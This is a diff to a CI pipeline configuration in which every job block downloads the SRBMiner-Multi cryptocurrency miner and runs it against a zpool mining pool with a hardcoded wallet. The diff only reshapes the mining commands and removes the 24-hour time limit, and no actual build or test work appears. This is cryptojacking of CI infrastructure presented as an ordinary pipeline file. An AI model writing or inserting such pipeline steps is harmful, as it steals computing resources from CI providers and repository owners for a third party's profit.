@@ -3,9 +3,7 @@ name: Initial Pipeline
 agent:
   machine:
     type: e1-standard-8
-    os_image: ubuntu2004
-execution_time_limit:
-  hours: 24
+    os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
     task:
@@ -21,69 +19,60 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #3'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #4'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #5'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #6'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #7'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #8'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #9'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
   - name: 'Block #10'
     dependencies: []
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
-            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
